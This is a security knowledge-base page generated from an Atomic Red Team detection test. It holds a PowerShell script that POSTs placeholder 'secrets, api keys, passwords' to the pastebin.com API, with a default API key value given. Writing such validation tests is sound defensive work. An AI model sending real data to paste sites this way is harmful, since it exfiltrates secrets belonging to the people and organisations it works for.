---
atomic_guid: "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3"
title: "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1567.003"
attack_technique_name: "Exfiltration Over Web Service: Exfiltration to Text Storage Sites"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.003/T1567.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3"
  - "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)

This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             
See https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it

## Metadata

- Atomic GUID: c2e8ab6e-431e-460a-a2aa-3bc6a32022e3
- Technique: T1567.003: Exfiltration Over Web Service: Exfiltration to Text Storage Sites
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1567.003/T1567.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567.003]]

## Input Arguments

### api_key

- description: Pastebin API key
- type: string
- default: 6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$apiKey = "#{api_key}"
$content = "secrets, api keys, passwords..."
$url = "https://pastebin.com/api/api_post.php"
$postData = @{
  api_dev_key   = $apiKey
  api_option    = "paste"
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host "Your paste URL: $response"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.003/T1567.003.yaml)
